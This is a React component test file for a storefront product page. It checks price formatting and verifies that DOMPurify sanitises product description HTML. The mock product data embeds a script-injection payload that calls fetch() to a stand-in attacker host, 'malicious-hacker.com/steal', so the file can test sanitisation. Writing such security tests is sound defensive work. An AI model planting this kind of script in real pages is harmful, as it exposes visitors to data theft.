// @vitest-environment jsdom
import { render, screen } from '@testing-library/react';
import { describe, it, expect, vi } from 'vitest';
import { MemoryRouter, Route, Routes } from 'react-router-dom';
import '@testing-library/jest-dom';
import ProductPage from '../components/ProductPage';

vi.mock('./InquiryModal', () => ({ default: () => <div data-testid="inquiry-modal" /> }));
vi.mock('./TikTokSection', () => ({ default: () => <div data-testid="tiktok-section" /> }));

const mockProducts = [
  {
    id: "gid://shopify/Product/1",
    name: "ROCK STAR",
    price: "699",
    image_url: "https://asteri2kstudio.com/rockstar.jpg",
    descriptionHtml: "<p>Cosmic Y2K Fantasy Set.</p><script>fetch('http://malicious-hacker.com/steal')</script>",
    variants: [{ id: "v1", title: "S", stock: 5, available: true }]
  }
];

const renderComponent = (products) => {
  return render(
    <MemoryRouter initialEntries={['/product/gid%3A%2F%2Fshopify%2FProduct%2F1']}>
      <Routes>
        <Route
          path="/product/:id"
          element={<ProductPage allProducts={products} addToCart={vi.fn()} onOpenCart={vi.fn()} />}
        />
      </Routes>
    </MemoryRouter>
  );
};

describe('Product Page Core Suite: Function & Security Integrity', () => {

  it('should format prices correctly according to lookbook specifications', () => {
    renderComponent(mockProducts);

    expect(screen.getByText('THB 699')).toBeInTheDocument();
    expect(screen.getByText('ROCK STAR')).toBeInTheDocument();
  });

  it('should strip malicious script tags from descriptionHtml via DOMPurify', () => {
    const { container } = renderComponent(mockProducts);

    expect(screen.getByText('Cosmic Y2K Fantasy Set.')).toBeInTheDocument();

    const scriptTag = container.querySelector('script');
    expect(scriptTag).toBeNull();

    expect(container.innerHTML).not.toContain("fetch('http://malicious-hacker.com/steal')");
  });
});